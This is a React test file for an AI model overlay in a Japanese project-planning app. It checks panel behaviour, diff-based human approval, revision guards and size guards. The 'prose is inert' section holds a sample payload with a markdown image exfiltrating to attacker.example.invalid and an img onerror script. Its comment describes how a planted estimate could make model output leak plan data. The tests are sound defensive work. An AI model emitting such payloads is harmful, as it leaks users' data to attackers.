// @vitest-environment happy-dom

import { cleanup, fireEvent, render, screen } from "@testing-library/react";
import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import type { ProjectCommand } from "@vecta/application";
import { AssistantOverlay } from "~/assistant/assistant-overlay";
import {
  ASSISTANT_PROPOSAL_KIND,
  type AssistantActionResult,
  type AssistantProposal,
  type AssistantProposalRequest,
} from "~/assistant/proposal-contract";
import { STORAGE_KEY } from "~/assistant/panel-geometry";

/**
 * The overlay takes its proposal seam as PROPS, so these tests exercise the real
 * component with no data router and no network — the same reason the grid's queue
 * harness can drive connected mode without one.
 */

afterEach(cleanup);

beforeEach(() => {
  window.localStorage.clear();
  // A roomy window, so the review-size guard is satisfied by default and the tests
  // that care about it can opt in explicitly.
  Object.defineProperty(window, "innerWidth", { value: 1440, configurable: true });
  Object.defineProperty(window, "innerHeight", { value: 900, configurable: true });
});

const REVISION = "7";

function proposalWith(overrides: Partial<AssistantProposal> = {}): AssistantProposal {
  return {
    mode: "chat",
    expectedRevision: REVISION,
    commands: [
      { type: "task.update", taskId: "11111111-1111-4111-8111-111111111111", changes: { progressBasisPoints: 5_000 } },
    ],
    diff: {
      entries: [
        {
          commandType: "task.update",
          operation: "update",
          target: "No.17 認証基盤の実装",
          changes: [{ field: "進捗", before: "20 %", after: "50 %" }],
        },
      ],
      addedTasks: 0,
      updatedTasks: 1,
      masterChanges: 0,
    },
    unresolved: [],
    summary: "1 件の進捗を更新します",
    model: "fake:test",
    usage: { unit: "tokens", input: 100, output: 20 },
    ...overrides,
  };
}

function ok(proposal: AssistantProposal): AssistantActionResult {
  return { ok: true, kind: ASSISTANT_PROPOSAL_KIND, proposal };
}

interface Harness {
  readonly onPropose: ReturnType<typeof vi.fn>;
  readonly onApply: ReturnType<typeof vi.fn>;
  readonly rerenderWith: (result: AssistantActionResult | undefined) => void;
}

function mount(
  options: {
    readonly result?: AssistantActionResult;
    readonly confirmedRevision?: string;
    readonly canApply?: boolean;
    readonly inFlight?: boolean;
    readonly openPanel?: boolean;
  } = {},
): Harness {
  const onPropose = vi.fn<(request: AssistantProposalRequest) => void>();
  const onApply = vi.fn<(commands: readonly ProjectCommand[]) => boolean>(() => true);
  const view = (result: AssistantActionResult | undefined) => (
    <AssistantOverlay
      proposeSeam={{ onPropose, inFlight: options.inFlight ?? false, result }}
      confirmedRevision={options.confirmedRevision ?? REVISION}
      canApply={options.canApply ?? true}
      onApply={onApply}
    />
  );
  const { rerender } = render(view(undefined));
  if (options.openPanel !== false) {
    fireEvent.click(screen.getByTestId("assistant-launch"));
  }
  if (options.result !== undefined) rerender(view(options.result));
  return {
    onPropose,
    onApply,
    rerenderWith: (result) => rerender(view(result)),
  };
}

describe("assistant overlay — a panel, not a page", () => {
  it("stays closed until asked, and closes again", () => {
    mount({ openPanel: false });
    expect(screen.queryByTestId("assistant-panel")).toBeNull();
    fireEvent.click(screen.getByTestId("assistant-launch"));
    expect(screen.getByTestId("assistant-panel")).toBeTruthy();
    fireEvent.click(screen.getByTestId("assistant-launch"));
    expect(screen.queryByTestId("assistant-panel")).toBeNull();
  });

  it("is non-modal — no backdrop and no aria-modal, so the grid behind stays usable", () => {
    mount();
    const panel = screen.getByTestId("assistant-panel");
    expect(panel.getAttribute("aria-modal")).toBeNull();
    expect(panel.getAttribute("role")).toBe("dialog");
  });

  it("restores a stored size and position", () => {
    window.localStorage.setItem(
      STORAGE_KEY,
      JSON.stringify({ x: 120, y: 60, width: 620, height: 500 }),
    );
    mount();
    const panel = screen.getByTestId("assistant-panel");
    expect(panel.style.left).toBe("120px");
    expect(panel.style.width).toBe("620px");
  });

  it("persists a resize, so the choice survives a reload", () => {
    mount();
    const handle = screen.getByTestId("assistant-resize-handle");
    // happy-dom has no pointer capture; stub it so the drag handlers run.
    handle.setPointerCapture = () => undefined;
    handle.releasePointerCapture = () => undefined;
    fireEvent.pointerDown(handle, { button: 0, pointerId: 1, clientX: 500, clientY: 500 });
    fireEvent.pointerMove(handle, { pointerId: 1, clientX: 700, clientY: 620 });
    fireEvent.pointerUp(handle, { pointerId: 1 });
    const stored = JSON.parse(window.localStorage.getItem(STORAGE_KEY) ?? "{}");
    expect(stored.width).toBeGreaterThan(480);
  });
});

describe("assistant overlay — asking for a proposal", () => {
  it("sends the utterance and, in chat mode, nothing else the first time", () => {
    const harness = mount();
    fireEvent.change(screen.getByTestId("assistant-input"), {
      target: { value: "No.17 を 50% にして" },
    });
    fireEvent.click(screen.getByTestId("assistant-submit"));
    expect(harness.onPropose).toHaveBeenCalledWith({
      mode: "chat",
      input: "No.17 を 50% にして",
    });
  });

  it("carries the conversation forward — client-held, never persisted", () => {
    const harness = mount();
    fireEvent.change(screen.getByTestId("assistant-input"), { target: { value: "ひとつめ" } });
    fireEvent.click(screen.getByTestId("assistant-submit"));
    harness.rerenderWith(ok(proposalWith({ summary: "やりました" })));
    fireEvent.change(screen.getByTestId("assistant-input"), { target: { value: "ふたつめ" } });
    fireEvent.click(screen.getByTestId("assistant-submit"));

    expect(harness.onPropose).toHaveBeenLastCalledWith({
      mode: "chat",
      input: "ふたつめ",
      history: [
        { role: "user", content: "ひとつめ" },
        { role: "assistant", content: "やりました" },
      ],
    });
    // Nothing about the conversation is written anywhere but component state.
    expect(window.localStorage.getItem(STORAGE_KEY)).not.toContain("ひとつめ");
  });

  it("sends no history in ingest mode — a document is not a conversation", () => {
    const harness = mount();
    fireEvent.change(screen.getByTestId("assistant-input"), { target: { value: "先の発話" } });
    fireEvent.click(screen.getByTestId("assistant-submit"));
    fireEvent.click(screen.getByRole("tab", { name: "見積書の取り込み" }));
    fireEvent.change(screen.getByTestId("assistant-input"), { target: { value: "見積書の本文" } });
    fireEvent.click(screen.getByTestId("assistant-submit"));
    expect(harness.onPropose).toHaveBeenLastCalledWith({
      mode: "ingest",
      input: "見積書の本文",
    });
  });

  it("does not ask twice while a request is in flight", () => {
    const harness = mount({ inFlight: true });
    fireEvent.change(screen.getByTestId("assistant-input"), { target: { value: "x" } });
    fireEvent.click(screen.getByTestId("assistant-submit"));
    expect(harness.onPropose).not.toHaveBeenCalled();
  });

  it("shows a failure message and no proposal", () => {
    mount({
      result: { ok: false, code: "MODEL_QUOTA_EXHAUSTED", message: "本日の無料枠を使い切りました" },
    });
    expect(screen.getByTestId("assistant-error").textContent).toContain("無料枠");
    expect(screen.queryByTestId("assistant-proposal")).toBeNull();
  });
});

describe("assistant overlay — the model's prose is inert (A19)", () => {
  // The quiet attack this closes: exfiltration does not need the database. A
  // markdown image resolves the moment it paints, carrying a slice of the plan to
  // whoever wrote the estimate — and painting happens before anyone decides
  // whether to approve, so rejecting the proposal is already too late.
  const hostile =
    "![x](https://attacker.example.invalid/?d=leak) [click](https://attacker.example.invalid) <img src=x onerror=alert(1)>";

  it("renders a summary as text — no image, no link, no injected element", () => {
    mount({ result: ok(proposalWith({ summary: hostile })) });
    const summary = screen.getByTestId("assistant-summary");
    expect(summary.querySelectorAll("img")).toHaveLength(0);
    expect(summary.querySelectorAll("a")).toHaveLength(0);
    // The characters are still shown verbatim, which is the honest presentation:
    // the user sees exactly what the model wrote.
    expect(summary.textContent).toContain("![x](https://attacker.example.invalid/?d=leak)");
  });

  it("renders a chat turn as text too", () => {
    const harness = mount();
    fireEvent.change(screen.getByTestId("assistant-input"), { target: { value: "x" } });
    fireEvent.click(screen.getByTestId("assistant-submit"));
    harness.rerenderWith(ok(proposalWith({ summary: hostile })));
    const thread = screen.getByTestId("assistant-thread");
    expect(thread.querySelectorAll("img")).toHaveLength(0);
    expect(thread.querySelectorAll("a")).toHaveLength(0);
  });

  it("labels the prose as the AI's explanation, separately from the diff (A16)", () => {
    // A proposal can rewrite everything while its summary claims three additions,
    // so the two must be impossible to confuse.
    mount({ result: ok(proposalWith({ summary: "3 タスクを追加しました" })) });
    expect(screen.getByTestId("assistant-summary").textContent).toContain("AI の説明");
    const diff = screen.getByTestId("assistant-diff");
    expect(diff.textContent).toContain("進捗");
    expect(diff.textContent).not.toContain("3 タスクを追加しました");
  });
});

describe("assistant overlay — approving", () => {
  it("shows an update as old → new, so an erasure looks like one", () => {
    mount({
      result: ok(
        proposalWith({
          diff: {
            entries: [
              {
                commandType: "task.update",
                operation: "update",
                target: "No.17 認証基盤の実装",
                changes: [{ field: "計画工数", before: "40 h", after: "0 h" }],
              },
            ],
            addedTasks: 0,
            updatedTasks: 1,
            masterChanges: 0,
          },
        }),
      ),
    });
    const diff = screen.getByTestId("assistant-diff");
    expect(diff.textContent).toContain("40 h");
    expect(diff.textContent).toContain("0 h");
  });

  it("hands the DOMAIN commands to the grid's own execute — the one write path", () => {
    const harness = mount({ result: ok(proposalWith()) });
    fireEvent.click(screen.getByTestId("assistant-apply"));
    expect(harness.onApply).toHaveBeenCalledTimes(1);
    const commands = harness.onApply.mock.calls[0]?.[0] as readonly ProjectCommand[];
    expect(commands).toEqual([
      {
        type: "task.update",
        taskId: "11111111-1111-4111-8111-111111111111",
        changes: { progressBasisPoints: 5_000 },
      },
    ]);
    expect(screen.getByTestId("assistant-applied")).toBeTruthy();
  });

  it("refuses a proposal built on a revision the grid has moved past", () => {
    // Somebody else edited the WBS while the proposal sat on screen. Applying it
    // would edit a plan the model never saw.
    const harness = mount({ result: ok(proposalWith()), confirmedRevision: "9" });
    expect(screen.getByTestId("assistant-blocked").textContent).toContain("作り直して");
    fireEvent.click(screen.getByTestId("assistant-apply"));
    expect(harness.onApply).not.toHaveBeenCalled();
  });

  it("waits for an in-flight save to settle", () => {
    const harness = mount({ result: ok(proposalWith()), canApply: false });
    expect(screen.getByTestId("assistant-blocked").textContent).toContain("保存の完了");
    fireEvent.click(screen.getByTestId("assistant-apply"));
    expect(harness.onApply).not.toHaveBeenCalled();
  });

  it("re-blocks apply if the user shrinks the panel after the diff arrives", () => {
    // ADR 0013's constraint: every barrier in front of a bad proposal works, and
    // none of them help if the last one — a person reading the diff — happens in a
    // corner of the screen. The proposal arrives and maximises the panel; dragging
    // it back down has to take the apply button with it.
    const harness = mount({ result: ok(proposalWith()) });
    expect(screen.queryByTestId("assistant-blocked")).toBeNull();

    const handle = screen.getByTestId("assistant-resize-handle");
    handle.setPointerCapture = () => undefined;
    handle.releasePointerCapture = () => undefined;
    fireEvent.pointerDown(handle, { button: 0, pointerId: 1, clientX: 1400, clientY: 880 });
    fireEvent.pointerMove(handle, { pointerId: 1, clientX: 400, clientY: 300 });
    fireEvent.pointerUp(handle, { pointerId: 1 });

    expect(Number.parseInt(screen.getByTestId("assistant-panel").style.width, 10)).toBeLessThan(560);
    expect(screen.getByTestId("assistant-blocked").textContent).toContain("大きさ");
    fireEvent.click(screen.getByTestId("assistant-apply"));
    expect(harness.onApply).not.toHaveBeenCalled();

    // The offered way out actually works.
    fireEvent.click(screen.getByText("広げる"));
    expect(screen.queryByTestId("assistant-blocked")).toBeNull();
    fireEvent.click(screen.getByTestId("assistant-apply"));
    expect(harness.onApply).toHaveBeenCalledTimes(1);
  });

  it("maximises itself the moment a diff arrives, so approval has room", () => {
    window.localStorage.setItem(
      STORAGE_KEY,
      JSON.stringify({ x: 0, y: 0, width: 360, height: 260 }),
    );
    mount({ result: ok(proposalWith()) });
    const panel = screen.getByTestId("assistant-panel");
    expect(Number.parseInt(panel.style.width, 10)).toBeGreaterThan(560);
    // …and apply is therefore available.
    expect(screen.queryByTestId("assistant-blocked")).toBeNull();
  });

  it("disables apply when the proposal carries no commands", () => {
    mount({
      result: ok(
        proposalWith({
          commands: [],
          diff: { entries: [], addedTasks: 0, updatedTasks: 0, masterChanges: 0 },
        }),
      ),
    });
    expect(screen.getByTestId("assistant-apply").hasAttribute("disabled")).toBe(true);
  });

  it("discards a proposal without touching the grid", () => {
    const harness = mount({ result: ok(proposalWith()) });
    fireEvent.click(screen.getByTestId("assistant-discard"));
    expect(screen.queryByTestId("assistant-proposal")).toBeNull();
    expect(harness.onApply).not.toHaveBeenCalled();
  });

  it("shows unresolved references rather than hiding a gap", () => {
    mount({
      result: ok(
        proposalWith({
          unresolved: [
            { kind: "process", reference: "受入", reason: "not-found", at: "tasks[0]" },
            { kind: "member", reference: "山田", reason: "missing-field", at: "masters[0]" },
          ],
        }),
      ),
    });
    const unresolved = screen.getByTestId("assistant-unresolved");
    expect(unresolved.textContent).toContain("工程「受入」");
    expect(unresolved.textContent).toContain("見つかりません");
    expect(unresolved.textContent).toContain("メンバー「山田」");
  });
});
